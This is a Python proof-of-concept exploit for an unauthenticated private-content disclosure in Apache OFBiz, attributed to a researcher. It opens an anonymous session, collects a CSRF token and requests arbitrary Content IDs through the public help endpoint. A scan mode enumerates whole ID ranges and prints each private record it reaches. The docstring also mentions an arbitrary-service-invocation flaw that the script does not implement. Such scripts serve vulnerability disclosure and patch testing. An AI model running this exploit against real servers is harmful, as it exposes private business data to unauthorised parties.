#!/usr/bin/env python3
"""Apache OFBiz unauthenticated private-Content disclosure (CVE-2026-82894).

The public /sfa/control/showHelpPublic endpoint takes an attacker-chosen
Content.contentId and renders its DataResource with no check that the record is
public, published, or part of the help tree. An anonymous request reads private
ELECTRONIC_TEXT and SHORT_TEXT content the protected stream route would refuse.

The same renderer also runs a service named on the row (Content.serviceName),
which is the arbitrary-service-invocation root Apache and an independent
researcher confirmed for this CVE. This client demonstrates the disclosure half.
Fixed in Apache OFBiz 24.09.08.
"""

import argparse
import os
import re
import sys

import requests

BOOTSTRAP = "/sfa/control/main?visualThemeId=COMMON"
# navigateHelp selects the document-rendering branch while contentId chooses the protected record.
TRIGGER = "/sfa/control/showHelpPublic"
MISSING = ("Could not find content with contentId", "No content found for content ID")

# --- terminal UI ---
_BANNER = r"""
  ___  _____ ____ ___ _____
 / _ \|  ___| __ )_ _|__  /
| | | | |_  |  _ \| |  / /
| |_| |  _| | |_) | | / /_
 \___/|_|   |____/___/____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def banner(subtitle):
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg): sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")
def good(msg): sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")
def warn(msg): sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")
def bad(msg): sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")
def die(msg): bad(msg); sys.exit(1)


def output(data, label):
    good(label)
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
    sys.stdout.write(data if data.endswith("\n") else data + "\n")
    sys.stdout.flush()
# --- end terminal UI ---


def csrf_token(body):
    # Theme templates emit meta-tag attributes in either order across supported OFBiz builds.
    for pat in (r'name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)',
                r'content=["\']([^"\']+)["\'][^>]*name=["\']csrf-token["\']'):
        m = re.search(pat, body, re.I)
        if m:
            return m.group(1)
    return None


def disclose(session, base, headers, content_id):
    # The public help controller accepts an arbitrary Content.contentId from the anonymous caller.
    r = session.post(base + TRIGGER, data={"helpTopic": "navigateHelp", "contentId": content_id},
                     headers=headers, timeout=15)
    if r.status_code in (401, 403):
        die(f"public help route returned HTTP {r.status_code}; the target may be patched")
    if any(m in r.text for m in MISSING):
        return None
    # Extract only the rendered document region so page chrome cannot produce a false disclosure hit.
    start = re.search(r'<div\b(?=[^>]*\bid=["\']Document["\'])[^>]*>', r.text, re.I)
    if not start:
        return None
    end = re.search(r'</div>\s*<!--\s*End section Widget '
                    r'component://common-theme/widget/HelpScreens\.xml#showDocumentHelp',
                    r.text[start.end():], re.I | re.S)
    if not end:
        return None
    return r.text[start.end():start.end() + end.start()].strip()


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  %(prog)s https://target:8443 SEC-PRIVATE-CONT\n"
               "  %(prog)s https://target:8443 --scan 10000 11000\n")
    ap.add_argument("target", metavar="URL", help="OFBiz HTTPS origin, e.g. https://host:8443")
    ap.add_argument("content_id", nargs="?", metavar="ID", help="Content.contentId to read")
    ap.add_argument("--scan", nargs=2, type=int, metavar=("START", "END"),
                    help="read an inclusive numeric Content ID range instead of one ID")
    ap.add_argument("--verify-tls", action="store_true", help="verify TLS (off by default; OFBiz ships self-signed certs)")
    ap.add_argument("--no-color", action="store_true", help="disable coloured output")
    args = ap.parse_args()
    if args.no_color:
        globals()["_COLOR"] = False
    if bool(args.content_id) == bool(args.scan):
        ap.error("give either a content_id or --scan START END")

    banner("unauthenticated private-Content disclosure  ·  CVE-2026-82894")
    base = args.target.rstrip("/")
    session = requests.Session()
    session.verify = args.verify_tls
    if not args.verify_tls:
        requests.packages.urllib3.disable_warnings()

    # Even anonymous AJAX requests may need the CSRF token issued by the initial SFA page.
    info(f"Bootstrapping an anonymous SFA session through {BOOTSTRAP}")
    boot = session.get(base + BOOTSTRAP, timeout=15)
    info(f"Bootstrap response: HTTP {boot.status_code}")
    if session.cookies:
        good("Anonymous session cookie obtained")
    token = csrf_token(boot.text)
    headers = {"X-Requested-With": "XMLHttpRequest"}
    if token:
        good("Anonymous AJAX CSRF token obtained")
        headers["X-CSRF-Token"] = token

    if args.content_id:
        info(f"Requesting Content {args.content_id!r} through {TRIGGER}")
        body = disclose(session, base, headers, args.content_id)
        if not body:
            die(f"Content {args.content_id!r} was not found or rendered empty")
        output(body, f"disclosed private Content {args.content_id!r} without authentication")
        return

    lo, hi = args.scan
    if hi < lo:
        ap.error("--scan END must be >= START")
    info(f"Scanning Content IDs {lo} through {hi}")
    found = 0
    # Missing or empty records are silent; emit only ids that reached the document renderer.
    for cid in range(lo, hi + 1):
        body = disclose(session, base, headers, str(cid))
        if body:
            found += 1
            output(body, f"disclosed private Content {cid}")
    good(f"Scan complete; {found} record(s) disclosed") if found else die("no content disclosed in range")


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        die(f"request failed: {e}")
    except KeyboardInterrupt:
        sys.exit(130)
